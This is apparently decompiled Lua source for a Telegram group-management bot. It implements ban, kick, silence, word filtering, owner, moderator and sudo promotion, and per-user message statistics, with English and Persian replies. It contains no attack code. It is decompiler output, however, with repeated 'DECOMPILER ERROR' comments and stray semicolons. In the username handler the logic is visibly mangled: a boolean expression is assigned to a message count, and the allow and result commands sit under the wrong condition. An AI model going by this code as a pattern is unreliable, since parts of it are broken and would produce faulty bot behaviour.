  redis:del("GroupSettings:" .. (msg.to).id)
  ;
  (tdcli.changeChatMemberStatus)((msg.to).id, our_id, "Left", dl_cb, nil)
end

local botremByID = function(msg, gp)
  -- function num : 0_32 , upvalues : _ENV
  local data = load_data("./data/moderation.json")
  data[tostring(gp)] = nil
  save_data("./data/moderation.json", data)
  local groups = "groups"
  if not data[tostring(groups)] then
    data[tostring(groups)] = nil
    save_data("./data/moderation.json", data)
  end
  -- DECOMPILER ERROR at PC33: Confused about usage of register: R4 in 'UnsetPending'

  ;
  (data[tostring(groups)])[tostring(gp)] = nil
  save_data("./data/moderation.json", data)
  redis:del("CheckExpire::" .. gp)
  redis:del("ExpireDate:" .. gp)
  redis:del("BotHaveRankMembers(Group)" .. gp)
  redis:srem("BotGroups", gp)
  redis:srem("Bot(EN)Groups", gp)
  redis:srem("Bot(FA)Groups", gp)
  redis:del("GroupSettings:" .. gp)
  ;
  (tdcli.changeChatMemberStatus)(gp, our_id, "Left", dl_cb, nil)
end

getsilentlist = function(chat_id)
  -- function num : 0_33 , upvalues : _ENV
  lang = redis:get("gp_lang:" .. chat_id)
  GetSilentList = redis:smembers("GroupSilentUsers:" .. chat_id)
  if #GetSilentList == 0 then
    if not lang then
      return "*Silent list is empty*"
    else
      return "لیست کاربران ساکت خالی است"
    end
  end
  if not lang then
    message = "*List of silent users:*\n"
  else
    message = "لیست کاربران ساکت شده:\n"
  end
  for k,v in pairs(GetSilentList) do
    message = message .. k .. "- " .. v .. "\n"
  end
  return message
end

local action_by_reply2 = function(arg, data)
  -- function num : 0_34 , upvalues : _ENV, already_sudo, getindex, reload_plugins
  local cmd = arg.cmd
  local lang = redis:get("gp_lang:" .. arg.chat_id)
  if not tonumber(data.sender_user_id_) then
    return false
  end
  if data.sender_user_id_ then
    do
      if cmd == "delsudo" then
        local desudo_cb = function(arg, data)
    -- function num : 0_34_0 , upvalues : already_sudo, _ENV, getindex, reload_plugins
    if not already_sudo(data.id_) then
      return SendStatus(arg.chat_id, data.id_, "is Not Sudo", "سودو نبود")
    end
    redis:srem("BotHaveRankMembers", tonumber(data.id_))
    ;
    (table.remove)(_config.sudo_users, getindex(_config.sudo_users, tonumber(data.id_)))
    save_config()
    reload_plugins(true)
    return SendStatus(arg.chat_id, data.id_, "Demoted From Sudo", "دیگه سودو نیست!")
  end

        tdcli_function({ID = "GetUser", user_id_ = data.sender_user_id_}, desudo_cb, {chat_id = data.chat_id_, user_id = data.sender_user_id_})
      end
      do
        if cmd == "setsudo" then
          local SetSudo_cb = function(arg, data)
    -- function num : 0_34_1 , upvalues : already_sudo, _ENV
    if already_sudo(data.id_) then
      return SendStatus(arg.chat_id, data.id_, "Already Sudo", "از قبل سودو بود")
    else
      redis:sadd("BotHaveRankMembers", tonumber(data.id_))
      redis:sadd("SudoAccess" .. data.id_, "installgroups")
      redis:sadd("SudoAccess" .. data.id_, "removegroups")
      redis:sadd("BotHaveRankMembers", tonumber(data.id_))
      ;
      (table.insert)(_config.sudo_users, tonumber(data.id_))
      save_config()
      plugins = {}
      load_plugins()
      return SendStatus(arg.chat_id, data.id_, "Promoted To Sudo", "به سودو ارتقا یافت")
    end
  end

          tdcli_function({ID = "GetUser", user_id_ = data.sender_user_id_}, SetSudo_cb, {chat_id = data.chat_id_, user_id = data.sender_user_id_})
        end
        if lang then
          return (tdcli.sendMessage)(data.chat_id_, "", 0, "`پیدا نشد`", 0, "md")
        else
          return (tdcli.sendMessage)(data.chat_id_, "", 0, "`Not Found`", 0, "md")
        end
      end
    end
  end
end

local action_by_username2 = function(arg, data)
  -- function num : 0_35 , upvalues : _ENV, already_sudo, getindex, reload_plugins
  local hash = "gp_lang:" .. arg.chat_id
  local lang = redis:get(hash)
  local cmd = arg.cmd
  if not arg.username then
    return false
  end
  if data.id_ then
    if cmd == "delsudo" then
      if not already_sudo(data.id_) then
        return SendStatus(arg.chat_id, data.id_, "is Not Sudo", "سودو نبود")
      end
      redis:srem("BotHaveRankMembers", tonumber(data.id_))
      ;
      (table.remove)(_config.sudo_users, getindex(_config.sudo_users, tonumber(data.id_)))
      save_config()
      reload_plugins(true)
      return SendStatus(arg.chat_id, data.id_, "Demoted From Sudo", "دیگه سودو نیست!")
    end
    if cmd == "setsudo" then
      if already_sudo(data.id_) then
        return SendStatus(arg.chat_id, data.id_, "Already Sudo", "از قبل سودو بود")
      else
        redis:sadd("BotHaveRankMembers", tonumber(data.id_))
        redis:sadd("SudoAccess" .. data.id_, "installgroups")
        redis:sadd("SudoAccess" .. data.id_, "removegroups")
        redis:sadd("BotHaveRankMembers", tonumber(data.id_))
        ;
        (table.insert)(_config.sudo_users, tonumber(data.id_))
        save_config()
        plugins = {}
        load_plugins()
        return SendStatus(arg.chat_id, data.id_, "Promoted To Sudo", "به سودو ارتقا یافت")
      end
    end
  else
    if lang then
      return (tdcli.sendMessage)(arg.chat_id, "", 0, "`پیدا نشد`", 0, "md")
    else
      return (tdcli.sendMessage)(arg.chat_id, "", 0, "`Not Found`", 0, "md")
    end
  end
end

local action_by_id2 = function(arg, data)
  -- function num : 0_36 , upvalues : _ENV, already_sudo, getindex, reload_plugins
  local hash = "gp_lang:" .. arg.chat_id
  local lang = redis:get(hash)
  local cmd = arg.cmd
  if not tonumber(arg.user_id) then
    return false
  end
  if data.id_ then
    if data.username_ then
      user_name = "@" .. check_markdown(data.username_)
    else
      user_name = check_markdown(data.first_name_)
    end
    if cmd == "delsudo" then
      if not already_sudo(data.id_) then
        return SendStatus(arg.chat_id, data.id_, "is Not Sudo", "سودو نبود")
      end
      redis:srem("BotHaveRankMembers", tonumber(data.id_))
      ;
      (table.remove)(_config.sudo_users, getindex(_config.sudo_users, tonumber(data.id_)))
      save_config()
      reload_plugins(true)
      return SendStatus(arg.chat_id, data.id_, "Demoted From Sudo", "دیگه سودو نیست!")
    end
    if cmd == "setsudo" then
      if already_sudo(data.id_) then
        return SendStatus(arg.chat_id, data.id_, "Already Sudo", "از قبل سودو بود")
      else
        redis:sadd("BotHaveRankMembers", tonumber(data.id_))
        redis:sadd("SudoAccess" .. data.id_, "installgroups")
        redis:sadd("SudoAccess" .. data.id_, "removegroups")
        redis:sadd("BotHaveRankMembers", tonumber(data.id_))
        ;
        (table.insert)(_config.sudo_users, tonumber(data.id_))
        save_config()
        plugins = {}
        load_plugins()
        return SendStatus(arg.chat_id, data.id_, "Promoted To Sudo", "به سودو ارتقا یافت")
      end
    end
  else
    if lang then
      return (tdcli.sendMessage)(arg.chat_id, "", 0, "`پیدا نشد`", 0, "md")
    else
      return (tdcli.sendMessage)(arg.chat_id, "", 0, "`Not Found`", 0, "md")
    end
  end
end

local filter_word = function(msg, word)
  -- function num : 0_37 , upvalues : _ENV
  local hash = "gp_lang:" .. (msg.to).id
  local lang = redis:get(hash)
  if redis:sismember("GroupFilterList:" .. (msg.to).id, word) then
    redis:srem("GroupFilterList:" .. (msg.to).id, word)
    if not lang then
      text = "*Word:* `" .. word .. "`\n*Status:* `Unfiltered`"
      ;
      (tdcli.sendMessage)((msg.to).id, 0, 1, text, 1, "md")
    else
      if lang then
        text = "*کلمه:* `" .. word .. "`\n*وضعیت:* `فیلتر برداشته شد`"
        ;
        (tdcli.sendMessage)((msg.to).id, 0, 1, text, 1, "md")
      end
    end
  else
    redis:sadd("GroupFilterList:" .. (msg.to).id, word)
    if not lang then
      text = "*Word:* `" .. word .. "`\n*Status:* `Filtered`"
      ;
      (tdcli.sendMessage)((msg.to).id, 0, 1, text, 1, "md")
    else
      text = "*کلمه:* `" .. word .. "`\n*وضعیت:* `فیلتر شد`"
      ;
      (tdcli.sendMessage)((msg.to).id, 0, 1, text, 1, "md")
    end
  end
end

local action_by_reply_ = function(arg, data)
  -- function num : 0_38 , upvalues : _ENV
  local hash = "gp_lang:" .. data.chat_id_
  local lang = redis:get(hash)
  local cmd = arg.cmd
  if not tonumber(data.sender_user_id_) then
    return false
  end
  if data.sender_user_id_ then
    do
      if cmd == "ban" then
        local ban_cb = function(arg, data)
    -- function num : 0_38_0 , upvalues : _ENV
    local hash = "gp_lang:" .. arg.chat_id
    local lang = redis:get(hash)
    if isModerator(arg.chat_id, data.id_) then
      return NoAccess(arg.chat_id)
    end
    if redis:sismember("GroupBannedUsers:" .. arg.chat_id, data.id_) then
      return SendStatus(arg.chat_id, data.id_, "Already Banned", "از قبل محروم بود")
    end
    redis:sadd("GroupBannedUsers:" .. arg.chat_id, data.id_)
    kick_user(data.id_, arg.chat_id)
    return SendStatus(arg.chat_id, data.id_, "Banned", "محروم شد")
  end

        tdcli_function({ID = "GetUser", user_id_ = data.sender_user_id_}, ban_cb, {chat_id = data.chat_id_, user_id = data.sender_user_id_})
      end
      do
        if cmd == "unban" then
          local unban_cb = function(arg, data)
    -- function num : 0_38_1 , upvalues : _ENV
    local hash = "gp_lang:" .. arg.chat_id
    local lang = redis:get(hash)
    if not redis:sismember("GroupBannedUsers:" .. arg.chat_id, data.id_) then
      return SendStatus(arg.chat_id, data.id_, "is Not Banned", "محروم نبود")
    end
    redis:srem("GroupBannedUsers:" .. arg.chat_id, data.id_)
    return SendStatus(arg.chat_id, data.id_, "Unbanned", "از محرومیت خارج شد")
  end

          tdcli_function({ID = "GetUser", user_id_ = data.sender_user_id_}, unban_cb, {chat_id = data.chat_id_, user_id = data.sender_user_id_})
        end
        do
          if cmd == "silent" then
            local silent_cb = function(arg, data)
    -- function num : 0_38_2 , upvalues : _ENV
    local hash = "gp_lang:" .. arg.chat_id
    local lang = redis:get(hash)
    if data.username_ then
      user_name = "@" .. check_markdown(data.username_)
    else
      user_name = check_markdown(data.first_name_)
    end
    if isModerator(arg.chat_id, data.id_) then
      return NoAccess(arg.chat_id)
    end
    if redis:sismember("GroupSilentUsers:" .. arg.chat_id, data.id_) then
      return SendStatus(arg.chat_id, data.id_, "Already Silent", "از قبل ساکت بود")
    end
    redis:sadd("GroupSilentUsers:" .. arg.chat_id, data.id_)
    return SendStatus(arg.chat_id, data.id_, "Silented", "ساکت شد")
  end

            tdcli_function({ID = "GetUser", user_id_ = data.sender_user_id_}, silent_cb, {chat_id = data.chat_id_, user_id = data.sender_user_id_})
          end
          do
            if cmd == "unsilent" then
              local unsilent_cb = function(arg, data)
    -- function num : 0_38_3 , upvalues : _ENV
    local hash = "gp_lang:" .. arg.chat_id
    local lang = redis:get(hash)
    if data.username_ then
      user_name = "@" .. check_markdown(data.username_)
    else
      user_name = check_markdown(data.first_name_)
    end
    if not redis:sismember("GroupSilentUsers:" .. arg.chat_id, data.id_) then
      return SendStatus(arg.chat_id, data.id_, "is Not Silent", "ساکت نبود")
    end
    redis:srem("GroupSilentUsers:" .. arg.chat_id, data.id_)
    return SendStatus(arg.chat_id, data.id_, "Unsilented", "دیگه ساکت نیست!")
  end

              tdcli_function({ID = "GetUser", user_id_ = data.sender_user_id_}, unsilent_cb, {chat_id = data.chat_id_, user_id = data.sender_user_id_})
            end
            if cmd == "kick" then
              if isModerator(data.chat_id_, data.sender_user_id_) then
                return NoAccess(arg.chat_id)
              else
                kick_user(data.sender_user_id_, data.chat_id_)
              end
            end
            if cmd == "delall" then
              if isModerator(data.chat_id_, data.sender_user_id_) then
                return NoAccess(arg.chat_id)
              else
                ;
                (tdcli.deleteMessagesFromUser)(data.chat_id_, data.sender_user_id_, dl_cb, nil)
                return SendStatus(arg.chat_id, data.id_, "All Messages Deleted", "همه پیام ها پاک شدند")
              end
            end
            if lang then
              return (tdcli.sendMessage)(data.chat_id_, "", 0, "`پیدا نشد`", 0, "md")
            else
              return (tdcli.sendMessage)(data.chat_id_, "", 0, "`Not Found`", 0, "md")
            end
          end
        end
      end
    end
  end
end

local action_by_username_ = function(arg, data)
  -- function num : 0_39 , upvalues : _ENV
  local hash = "gp_lang:" .. arg.chat_id
  local lang = redis:get(hash)
  local cmd = arg.cmd
  local administration = load_data("./data/moderation.json")
  if not arg.username then
    return false
  end
  if data.id_ then
    if ((data.type_).user_).username_ then
      user_name = "@" .. check_markdown(((data.type_).user_).username_)
    else
      user_name = check_markdown(data.title_)
    end
    if cmd == "ban" then
      if isModerator(arg.chat_id, data.id_) then
        return NoAccess(arg.chat_id)
      end
      if redis:sismember("GroupBannedUsers:" .. arg.chat_id, data.id_) then
        return SendStatus(arg.chat_id, data.id_, "Already Banned", "از قبل محروم بود")
      end
      redis:sadd("GroupBannedUsers:" .. arg.chat_id, data.id_)
      kick_user(data.id_, arg.chat_id)
      return SendStatus(arg.chat_id, data.id_, "Banned", "محروم شد")
    end
    if cmd == "unban" then
      if not redis:sismember("GroupBannedUsers:" .. arg.chat_id, data.id_) then
        return SendStatus(arg.chat_id, data.id_, "is Not Banned", "محروم نیست")
      end
      redis:srem("GroupBannedUsers:" .. arg.chat_id, data.id_)
      return SendStatus(arg.chat_id, data.id_, "Unbanned", "از محرومیت خارج شد")
    end
    if cmd == "silent" then
      if isModerator(arg.chat_id, data.id_) then
        return NoAccess(arg.chat_id)
      end
      if redis:sismember("GroupSilentUsers:" .. arg.chat_id, data.id_) then
        return SendStatus(arg.chat_id, data.id_, "Already Silent", "از قبل ساکت بود")
      end
      redis:sadd("GroupSilentUsers:" .. arg.chat_id, data.id_)
      return SendStatus(arg.chat_id, data.id_, "Silented", "ساکت شد")
    end
    if cmd == "unsilent" then
      if not redis:sismember("GroupSilentUsers:" .. arg.chat_id, data.id_) then
        return SendStatus(arg.chat_id, data.id_, "is Not Silent", "ساکت نبود")
      end
      redis:srem("GroupSilentUsers:" .. arg.chat_id, data.id_)
      return SendStatus(arg.chat_id, data.id_, "Unsilented!", "دیگه ساکت نیست!")
    end
    if cmd == "kick" then
      if isModerator(arg.chat_id, data.id_) then
        return NoAccess(arg.chat_id)
      else
        kick_user(data.id_, arg.chat_id)
      end
    end
    if cmd == "delall" then
      if isModerator(arg.chat_id, data.id_) then
        return NoAccess(arg.chat_id)
      else
        ;
        (tdcli.deleteMessagesFromUser)(arg.chat_id, data.id_, dl_cb, nil)
        return SendStatus(arg.chat_id, data.id_, "All Messages Deleted", "همه پیام ها پاک شدند")
      end
    end
  else
    if lang then
      return (tdcli.sendMessage)(arg.chat_id, "", 0, "`پیدا نشد`", 0, "md")
    else
      return (tdcli.sendMessage)(arg.chat_id, "", 0, "`Not Found`", 0, "md")
    end
  end
end

local modlist = function(msg)
  -- function num : 0_40 , upvalues : _ENV
  local hash = "gp_lang:" .. (msg.to).id
  local lang = redis:get(hash)
  local data = load_data("./data/moderation.json")
  local i = 1
  if not data[tostring((msg.to).id)] then
    if not lang then
      return "`Group is not installed`"
    else
      return "گروه به لیست گروه های مدیریتی ربات اضافه نشده است"
    end
  end
  if next((data[tostring((msg.to).id)]).mods) == nil then
    if not lang then
      return "*No* *moderator* `in this group`"
    else
      return "مدیری وجود ندارد"
    end
  end
  if not lang then
    message = "*List of moderators :*\n"
  else
    message = "*لیست مدیران گروه :*\n"
  end
  for k,v in pairs((data[tostring((msg.to).id)]).mods) do
    message = message .. i .. "- " .. v .. " [" .. k .. "] \n"
    i = i + 1
  end
  return message
end

local ownerlist = function(msg)
  -- function num : 0_41 , upvalues : _ENV
  local hash = "gp_lang:" .. (msg.to).id
  local lang = redis:get(hash)
  local data = load_data("./data/moderation.json")
  local i = 1
  if not data[tostring((msg.to).id)] then
    if not lang then
      return "`Group is not installed`"
    else
      return "`این گروه نصب نشده است`"
    end
  end
  if next((data[tostring((msg.to).id)]).owners) == nil then
    if not lang then
      return "*No owners was not found in this group*"
    else
      return "*هیچ مالکی در این گروه یافت نشد*"
    end
  else
    if not lang then
      message = "*List of moderators :*\n"
    else
      message = "*لیست مالکان گروه :*\n"
    end
    for k,v in pairs((data[tostring((msg.to).id)]).owners) do
      message = message .. i .. "- " .. v .. " [" .. k .. "] \n"
      i = i + 1
    end
  end
  do
    return message
  end
end

local action_by_reply = function(arg, data)
  -- function num : 0_42 , upvalues : _ENV
  local hash = "gp_lang:" .. data.chat_id_
  local lang = redis:get(hash)
  local cmd = arg.cmd
  local administration = load_data("./data/moderation.json")
  if not tonumber(data.sender_user_id_) then
    return false
  end
  if data.sender_user_id_ then
    if not administration[tostring(data.chat_id_)] then
      if not lang then
        return (tdcli.sendMessage)(data.chat_id_, "", 0, "`Group is not installed`", 0, "md")
      else
        return (tdcli.sendMessage)(data.chat_id_, "", 0, "`گروه نصب نشده است`", 0, "md")
      end
    end
    do
      if cmd == "setowner" then
        local owner_cb = function(arg, data)
    -- function num : 0_42_0 , upvalues : _ENV
    local hash = "gp_lang:" .. arg.chat_id
    local lang = redis:get(hash)
    local administration = load_data("./data/moderation.json")
    if data.username_ then
      user_name = "@" .. check_markdown(data.username_)
    else
      user_name = check_markdown(data.first_name_)
    end
    if ((administration[tostring(arg.chat_id)]).owners)[tostring(data.id_)] then
      return SendStatus(arg.chat_id, data.id_, "Already owner", "از قبل مالک گروه بود")
    end
    redis:sadd("BotHaveRankMembers(Group)" .. arg.chat_id, data.id_)
    -- DECOMPILER ERROR at PC58: Confused about usage of register: R5 in 'UnsetPending'

    ;
    ((administration[tostring(arg.chat_id)]).owners)[tostring(data.id_)] = user_name
    save_data("./data/moderation.json", administration)
    return SendStatus(arg.chat_id, data.id_, "Promoted To owner", "به مالک گروه ارتقا یافت")
  end

        tdcli_function({ID = "GetUser", user_id_ = data.sender_user_id_}, owner_cb, {chat_id = data.chat_id_, user_id = data.sender_user_id_})
      end
      do
        if cmd == "promote" then
          local promote_cb = function(arg, data)
    -- function num : 0_42_1 , upvalues : _ENV
    local hash = "gp_lang:" .. arg.chat_id
    local lang = redis:get(hash)
    local administration = load_data("./data/moderation.json")
    if data.username_ then
      user_name = "@" .. check_markdown(data.username_)
    else
      user_name = check_markdown(data.first_name_)
    end
    if ((administration[tostring(arg.chat_id)]).mods)[tostring(data.id_)] then
      return SendStatus(arg.chat_id, data.id_, "Already Moderator", "از قبل مدیر گروه بود")
    end
    redis:sadd("BotHaveRankMembers(Group)" .. arg.chat_id, data.id_)
    -- DECOMPILER ERROR at PC58: Confused about usage of register: R5 in 'UnsetPending'

    ;
    ((administration[tostring(arg.chat_id)]).mods)[tostring(data.id_)] = user_name
    save_data("./data/moderation.json", administration)
    return SendStatus(arg.chat_id, data.id_, "Promoted To Moderator", "به مدیریت گروه ارتقا یافت")
  end

          tdcli_function({ID = "GetUser", user_id_ = data.sender_user_id_}, promote_cb, {chat_id = data.chat_id_, user_id = data.sender_user_id_})
        end
        do
          if cmd == "remowner" then
            local rem_owner_cb = function(arg, data)
    -- function num : 0_42_2 , upvalues : _ENV
    local hash = "gp_lang:" .. arg.chat_id
    local lang = redis:get(hash)
    local administration = load_data("./data/moderation.json")
    if data.username_ then
      user_name = "@" .. check_markdown(data.username_)
    else
      user_name = check_markdown(data.first_name_)
    end
    if not ((administration[tostring(arg.chat_id)]).owners)[tostring(data.id_)] then
      return SendStatus(arg.chat_id, data.id_, "is Not owner", "مالک گروه نبود")
    end
    redis:srem("BotHaveRankMembers(Group)" .. arg.chat_id, data.id_)
    -- DECOMPILER ERROR at PC57: Confused about usage of register: R5 in 'UnsetPending'

    ;
    ((administration[tostring(arg.chat_id)]).owners)[tostring(data.id_)] = nil
    save_data("./data/moderation.json", administration)
    return SendStatus(arg.chat_id, data.id_, "Demoted From owner", "دیگه مالک گروه نیست!")
  end

            tdcli_function({ID = "GetUser", user_id_ = data.sender_user_id_}, rem_owner_cb, {chat_id = data.chat_id_, user_id = data.sender_user_id_})
          end
          do
            if cmd == "demote" then
              local demote_cb = function(arg, data)
    -- function num : 0_42_3 , upvalues : _ENV
    local administration = load_data("./data/moderation.json")
    if data.username_ then
      user_name = "@" .. check_markdown(data.username_)
    else
      user_name = check_markdown(data.first_name_)
    end
    if not ((administration[tostring(arg.chat_id)]).mods)[tostring(data.id_)] then
      return SendStatus(arg.chat_id, data.id_, "is Not Moderator", "مدیر گروه نبود")
    end
    redis:srem("BotHaveRankMembers(Group)" .. arg.chat_id, data.id_)
    -- DECOMPILER ERROR at PC50: Confused about usage of register: R3 in 'UnsetPending'

    ;
    ((administration[tostring(arg.chat_id)]).mods)[tostring(data.id_)] = nil
    save_data("./data/moderation.json", administration)
    return SendStatus(arg.chat_id, data.id_, "Demoted From Moderator", "دیگه مدیر نیست!")
  end

              tdcli_function({ID = "GetUser", user_id_ = data.sender_user_id_}, demote_cb, {chat_id = data.chat_id_, user_id = data.sender_user_id_})
            end
            do
              if cmd == "id" then
                local id_cb = function(arg, data)
    -- function num : 0_42_4 , upvalues : _ENV, lang
    GpChats = redis:get("getMessages:" .. arg.chat_id) or 0
    UsChats = redis:get("getMessages:" .. data.id_ .. ":" .. arg.chat_id) or 0
    Percent_ = tonumber(UsChats) / tonumber(GpChats) * 100
    if Percent_ < 10 then
      Percent = "0" .. (string.sub)(Percent_, 1, 4)
    else
      if Percent_ >= 10 then
        Percent = (string.sub)(Percent_, 1, 5)
      end
    end
    if tonumber(Percent) <= 10 then
      if not lang then
        UsStatus = "Weak 😴"
      else
        UsStatus = "ضعیف 😴"
      end
    else
      if tonumber(Percent) <= 20 then
        if not lang then
          UsStatus = "Normal 😊"
        else
          UsStatus = "معمولی 😊"
        end
      else
        if tonumber(Percent) <= 100 then
          if not lang then
            UsStatus = "Active 😎"
          else
            UsStatus = "فعال 😎"
          end
        end
      end
    end
    if not lang then
      return (tdcli.sendMessage)(arg.chat_id, "", 0, "*ID:* (`" .. data.id_ .. "`)\n\n*Number of User Messages:* `" .. UsChats .. "`\n*Messages Percent:* %" .. Percent .. "\n*Status:* " .. UsStatus, 0, "md")
    else
      return (tdcli.sendMessage)(arg.chat_id, "", 0, "آیدی: (`" .. data.id_ .. "`)\n\nتعداد پیام های کاربر: `" .. UsChats .. "`\nدرصد پیام ها: " .. Percent .. "%\nوضعیت: " .. UsStatus, 0, "md")
    end
  end

                tdcli_function({ID = "GetUser", user_id_ = data.sender_user_id_}, id_cb, {chat_id = data.chat_id_, user_id = data.sender_user_id_})
              end
              if lang then
                return (tdcli.sendMessage)(data.chat_id_, "", 0, "`پیدا نشد`", 0, "md")
              else
                return (tdcli.sendMessage)(data.chat_id_, "", 0, "`Not Found`", 0, "md")
              end
            end
          end
        end
      end
    end
  end
end

local action_by_username = function(arg, data)
  -- function num : 0_43 , upvalues : _ENV
  local hash = "gp_lang:" .. arg.chat_id
  local lang = redis:get(hash)
  local cmd = arg.cmd
  local administration = load_data("./data/moderation.json")
  if not administration[tostring(arg.chat_id)] then
    if not lang then
      return (tdcli.sendMessage)(data.chat_id_, "", 0, "`Group is not installed`", 0, "md")
    else
      return (tdcli.sendMessage)(data.chat_id_, "", 0, "`گروه نصب نشده است`", 0, "md")
    end
  end
  if not arg.username then
    return false
  end
  if data.id_ then
    if ((data.type_).user_).username_ then
      user_name = "@" .. check_markdown(((data.type_).user_).username_)
    else
      user_name = check_markdown(data.title_)
    end
    if cmd == "setowner" then
      if ((administration[tostring(arg.chat_id)]).owners)[tostring(data.id_)] then
        return SendStatus(arg.chat_id, data.id_, "Already owner", "از قبل مالک گروه بود")
      end
      redis:sadd("BotHaveRankMembers(Group)" .. arg.chat_id, data.id_)
      -- DECOMPILER ERROR at PC102: Confused about usage of register: R6 in 'UnsetPending'

      ;
      ((administration[tostring(arg.chat_id)]).owners)[tostring(data.id_)] = user_name
      save_data("./data/moderation.json", administration)
      return SendStatus(arg.chat_id, data.id_, "Promoted To owner", "به مالکیت گروه ارتقا یافت")
    end
    if cmd == "promote" then
      if ((administration[tostring(arg.chat_id)]).mods)[tostring(data.id_)] then
        return SendStatus(arg.chat_id, data.id_, "Already Moderator", "از قبل مدیر گروه بود")
      end
      redis:sadd("BotHaveRankMembers(Group)" .. arg.chat_id, data.id_)
      -- DECOMPILER ERROR at PC150: Confused about usage of register: R6 in 'UnsetPending'

      ;
      ((administration[tostring(arg.chat_id)]).mods)[tostring(data.id_)] = user_name
      save_data("./data/moderation.json", administration)
      return SendStatus(arg.chat_id, data.id_, "Promoted To Moderator", "به مدیریت گروه ارتقا یافت")
    end
    if cmd == "remowner" then
      if not ((administration[tostring(arg.chat_id)]).owners)[tostring(data.id_)] then
        return SendStatus(arg.chat_id, data.id_, "is Not owner", "مالک گروه نبود")
      end
      redis:srem("BotHaveRankMembers(Group)" .. arg.chat_id, data.id_)
      -- DECOMPILER ERROR at PC197: Confused about usage of register: R6 in 'UnsetPending'

      ;
      ((administration[tostring(arg.chat_id)]).owners)[tostring(data.id_)] = nil
      save_data("./data/moderation.json", administration)
      return SendStatus(arg.chat_id, data.id_, "Demoted From owner", "دیگه مالک گروه نیست!")
    end
    if cmd == "demote" then
      if not ((administration[tostring(arg.chat_id)]).mods)[tostring(data.id_)] then
        return SendStatus(arg.chat_id, data.id_, "is Not Moderator", "مدیر گروه نبود")
      end
      redis:srem("BotHaveRankMembers(Group)" .. arg.chat_id, data.id_)
      -- DECOMPILER ERROR at PC244: Confused about usage of register: R6 in 'UnsetPending'

      ;
      ((administration[tostring(arg.chat_id)]).mods)[tostring(data.id_)] = nil
      save_data("./data/moderation.json", administration)
      return SendStatus(arg.chat_id, data.id_, "Demoted From Moderator", "دیگه مدیر نیست!")
    end
    if not redis:get("getMessages:" .. arg.chat_id) then
      GpChats = cmd ~= "id" or 0
      UsChats = redis:get("getMessages:" .. data.id_ .. ":" .. arg.chat_id) or 0
      Percent_ = tonumber(UsChats) / tonumber(GpChats) * 100
      if Percent_ < 10 then
        Percent = "0" .. (string.sub)(Percent_, 1, 4)
      else
        if Percent_ >= 10 then
          Percent = (string.sub)(Percent_, 1, 5)
        end
      end
      if tonumber(Percent) <= 10 then
        if not lang then
          UsStatus = "Weak 😴"
        else
          UsStatus = "ضعیف 😴"
        end
      else
        if tonumber(Percent) <= 20 then
          if not lang then
            UsStatus = "Normal 😊"
          else
            UsStatus = "معمولی 😊"
          end
        else
          if tonumber(Percent) <= 100 then
            if not lang then
              UsStatus = "Active 😎"
            else
              UsStatus = "فعال 😎"
            end
          end
        end
      end
      if not lang then
        return (tdcli.sendMessage)(arg.chat_id, "", 0, "*ID:* (`" .. data.id_ .. "`)\n\n*Number of User Messages:* `" .. UsChats .. "`\n*Messages Percent:* %" .. Percent .. "\n*Status:* " .. UsStatus, 0, "md")
      else
        return (tdcli.sendMessage)(arg.chat_id, "", 0, "آیدی: (`" .. data.id_ .. "`)\n\nتعداد پیام های کاربر: `" .. UsChats .. "`\nدرصد پیام ها: " .. Percent .. "%\nوضعیت: " .. UsStatus, 0, "md")
      end
      if cmd == "allow" then
        user = data.id_
        chat = arg.chat_id
        if not redis:get("AllowUser~" .. user .. "~From~" .. chat) then
          redis:set("AllowUser~" .. user .. "~From~" .. chat, true)
          redis:sadd("AllowUserFrom~" .. chat, user)
          if not lang then
            text = "*User:* `" .. user .. "`\n*Status:* `Added`"
            ;
            (tdcli.sendMessage)(chat, "", 0, text, 0, "md")
          else
            text = "*کاربر:* `" .. user .. "`\n*وضعیت:* `اضافه شد`"
            ;
            (tdcli.sendMessage)(chat, "", 0, text, 0, "md")
          end
        else
          redis:del("AllowUser~" .. user .. "~From~" .. chat)
          redis:srem("AllowUserFrom~" .. chat, user)
          if not lang then
            text = "*User:* `" .. user .. "`\n*Status:* `Removed`"
            ;
            (tdcli.sendMessage)(chat, "", 0, text, 0, "md")
          else
            text = "*کاربر:* `" .. user .. "`\n*وضعیت:* `حذف شد`"
            ;
            (tdcli.sendMessage)(chat, "", 0, text, 0, "md")
          end
        end
      end
      if cmd == "res" then
        if not lang then
          text = "Result for [ " .. check_markdown(((data.type_).user_).username_) .. " ] :\n" .. "" .. check_markdown(data.title_) .. "\n" .. " [" .. data.id_ .. "]"
        else
          text = "اطلاعات برای [ " .. check_markdown(((data.type_).user_).username_) .. " ] :\n" .. "" .. check_markdown(data.title_) .. "\n" .. " [" .. data.id_ .. "]"
        end
        return (tdcli.sendMessage)(arg.chat_id, 0, 1, text, 1, "md")
      end
    end
  end
end

local action_by_id = function(arg, data)
  -- function num : 0_44 , upvalues : _ENV
  local hash = "gp_lang:" .. arg.chat_id
  local lang = redis:get(hash)
  local cmd = arg.cmd
  local administration = load_data("./data/moderation.json")
  if not administration[tostring(arg.chat_id)] then
    if not lang then
      return (tdcli.sendMessage)(data.chat_id_, "", 0, "`Group is not installed`", 0, "md")
    else
      return (tdcli.sendMessage)(data.chat_id_, "", 0, "`گروه نصب نشده است`", 0, "md")
    end
  end
  if not tonumber(arg.user_id) then
    return false
  end
  if data.id_ and data.first_name_ then
    if data.username_ then
      user_name = "@" .. check_markdown(data.username_)
    else
      user_name = check_markdown(data.first_name_)
    end
    if cmd == "setowner" then
      if ((administration[tostring(arg.chat_id)]).owners)[tostring(data.id_)] then
        return SendStatus(arg.chat_id, data.id_, "Already owner", "از قبل مالک گروه بود")
      end
      redis:sadd("BotHaveRankMembers(Group)" .. arg.chat_id, data.id_)
      -- DECOMPILER ERROR at PC103: Confused about usage of register: R6 in 'UnsetPending'

      ;
      ((administration[tostring(arg.chat_id)]).owners)[tostring(data.id_)] = user_name
      save_data("./data/moderation.json", administration)
      return SendStatus(arg.chat_id, data.id_, "Promoted To owner", "به مالکیت گروه ارتقا یافت")
    end
    if cmd == "promote" then
      if ((administration[tostring(arg.chat_id)]).mods)[tostring(data.id_)] then
        return SendStatus(arg.chat_id, data.id_, "Already Moderator", "از قبل مدیر گروه بود")
      end
      redis:sadd("BotHaveRankMembers(Group)" .. arg.chat_id, data.id_)
      -- DECOMPILER ERROR at PC151: Confused about usage of register: R6 in 'UnsetPending'

      ;
      ((administration[tostring(arg.chat_id)]).mods)[tostring(data.id_)] = user_name
      save_data("./data/moderation.json", administration)
      return SendStatus(arg.chat_id, data.id_, "Promoted To Moderator", "به مدیریت گروه ارتقا یافت")
    end
